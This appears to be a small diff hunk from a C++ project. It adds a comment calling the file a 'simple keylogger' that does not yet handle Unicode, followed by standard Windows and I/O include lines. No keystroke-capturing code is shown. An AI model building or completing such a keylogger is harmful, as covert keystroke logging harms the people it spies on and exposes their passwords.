@@ -1,4 +1,5 @@
-﻿#include <iostream>
+//SIMPLE KEYLOGER .IT'S NOT COMPLETE BECAUSE OF DOES NOT HANDLE UNICODE KEYLOG
+#include <iostream>
 #include <windows.h>
 #include <fstream>
 #include <string>
